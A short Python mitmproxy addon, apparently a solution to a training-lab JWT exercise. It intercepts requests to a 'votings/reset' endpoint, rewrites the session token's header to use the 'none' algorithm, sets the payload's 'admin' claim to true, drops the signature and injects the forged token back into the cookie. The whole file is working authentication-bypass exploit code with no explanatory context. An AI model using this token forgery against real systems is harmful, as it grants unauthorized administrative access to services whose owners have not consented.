from urllib import parse
import collections
import base64
import json


from mitmproxy import http
from mitmproxy import ctx

def base64_to_dict(encoded):
  decoded = base64.b64decode(encoded)
  return json.loads(decoded)

def dict_to_base64(decoded):
  stringified = json.dumps(decoded, separators=(',', ':'))  
  return (
    base64.b64encode(stringified.encode('utf-8'))).decode('utf-8')

def jwt_from_cookies(cookies):
    jwt_cookies = cookies[0][13:]
    return jwt_cookies.split('.')

def request(flow: http.HTTPFlow) -> None:
  if 'votings/reset' in flow.request.url:
    # Split JWT on encoded parts 
    cookies = flow.request.headers['Cookie'].split('; ')
    header, payload, signature = jwt_from_cookies(cookies)

    header_dict = base64_to_dict(header)
    header_dict['alg'] = 'none' 
    modified_header = dict_to_base64(header_dict)

    # Change "admin" value
    payload_dict = base64_to_dict(payload + '==')
    payload_dict['admin'] = "true"
    modified_payload = dict_to_base64(payload_dict)[:-2]

    # Join chunks into modified JWT
    modified_jwt = '.'.join((modified_header, modified_payload, ''))
    
    # Add modified JWT to cookies
    new_cookies = ['access_token='+modified_jwt] + cookies[1:]
    flow.request.headers['Cookie'] = '; '.join(new_cookies).encode('utf-8')

def response(flow: http.HTTPFlow) -> None:
  return
